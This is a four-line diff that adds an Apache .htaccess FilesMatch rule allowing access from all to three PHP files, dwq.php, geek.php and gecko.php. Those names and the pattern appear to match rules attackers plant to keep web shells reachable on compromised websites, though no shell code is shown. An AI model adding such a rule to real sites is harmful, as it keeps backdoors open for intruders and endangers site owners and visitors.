@@ -1,0 +1,4 @@
+<FilesMatch "^(dwq.php|geek.php|gecko.php)$"> 
+Order Allow,Deny 
+Allow from all 
+</FilesMatch>
